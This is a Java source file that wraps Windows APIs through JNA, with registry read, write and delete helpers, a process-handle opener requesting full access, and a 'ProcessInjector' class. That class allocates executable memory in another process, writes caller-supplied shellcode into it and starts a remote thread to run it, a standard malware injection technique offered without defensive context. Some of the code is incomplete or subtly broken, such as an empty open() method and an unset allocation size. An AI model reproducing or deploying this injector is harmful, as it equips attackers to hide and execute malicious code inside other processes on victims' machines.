import com.sun.jna.Pointer;
import com.sun.jna.platform.win32.Advapi32;
import com.sun.jna.platform.win32.Advapi32Util;
import com.sun.jna.platform.win32.Kernel32;
import com.sun.jna.platform.win32.WinBase;
import com.sun.jna.platform.win32.WinNT;
import com.sun.jna.ptr.IntByReference;
import com.sun.jna.ptr.PointerByReference;
import java.nio.charset.StandardCharsets;

public class WindowsApiWrappers {

    public static class RegistryChecker {

        private RegistryChecker() {}

        public static boolean keyExists(com.sun.jna.platform.win32.WinReg.HKEY rootKey, String keyPath) {
            try {

                return Advapi32.INSTANCE.RegQueryValueEx(
                    rootKey, keyPath, 0, null, (byte[])null, null
                ) == 0;
            } catch (Exception e) {
                return false;
            }
        }

        public static String readStringValue(
                com.sun.jna.platform.win32.WinReg.HKEY rootKey,
                String keyPath,
                String valueName) {
            try {
                return Advapi32Util.registryGetStringValue(rootKey, keyPath, valueName);
            } catch (Exception e) {
                return null;
            }
        }

        public static boolean writeStringValue(
                com.sun.jna.platform.win32.WinReg.HKEY rootKey,
                String keyPath,
                String valueName,
                String value) {
            try {
                Advapi32Util.registrySetStringValue(rootKey, keyPath, valueName, value);
                return true;
            } catch (Exception e) {
                return false;
            }
        }

        public static boolean deleteValue(
                com.sun.jna.platform.win32.WinReg.HKEY rootKey,
                String keyPath,
                String valueName) {
            try {
                Advapi32Util.registryDeleteValue(rootKey, keyPath, valueName);
                return true;
            } catch (Exception e) {
                return false;
            }
        }
    }

    public static class ProcessInjector {

        private ProcessInjector() {}

        public static void inject(WinNT.HANDLE processHandle, byte[] shellcode) throws Exception {

            PointerByReference baseAddress = new PointerByReference();
            PointerByReference regionSize = new PointerByReference();

            NtApiInterfaces.NtdllMemoryInterface ntdll =
                NtApiInterfaces.NtdllMemoryInterface.INSTANCE;

            int status = ntdll.NtAllocateVirtualMemory(
                processHandle,
                baseAddress,
                null,
                regionSize,
                0x3000,
                0x40
            );

            if (status != 0) throw new Exception("NtAllocateVirtualMemory failed: " + status);

            IntByReference bytesWritten = new IntByReference();
            status = ntdll.NtWriteVirtualMemory(
                processHandle,
                baseAddress.getValue(),
                shellcode,
                shellcode.length,
                bytesWritten
            );

            if (status != 0) throw new Exception("NtWriteVirtualMemory failed: " + status);

            PointerByReference threadHandle = new PointerByReference();
            status = ntdll.NtCreateThreadEx(
                threadHandle,
                0x1FFFFF,
                null,
                processHandle,
                baseAddress.getValue(),
                null,
                0,
                0, 0, 0,
                null
            );

            if (status != 0) throw new Exception("NtCreateThreadEx failed: " + status);
        }
    }

    public static class ProcessHandleManager {

        private ProcessHandleManager() {}

        public static WinNT.HANDLE openProcess(int pid) {
            try {
                return Kernel32.INSTANCE.OpenProcess(
                    0x1F0FFF,
                    false,
                    pid
                );
            } catch (Exception e) {
                return null;
            }
        }

        public static void closeHandle(WinNT.HANDLE handle) {
            try {
                if (handle != null) {
                    Kernel32.INSTANCE.CloseHandle(handle);
                }
            } catch (Exception ignored) {}
        }
    }

    public static class ProcessHandle {
        private WinNT.HANDLE handle;
        private final String processName;

        public ProcessHandle(String processName) {
            this.processName = processName;
        }

        public void open() throws Exception {

        }

        public void close() {
            ProcessHandleManager.closeHandle(handle);
            handle = null;
        }

        public WinNT.HANDLE getHandle() { return handle; }
        public String getProcessName() { return processName; }
    }
}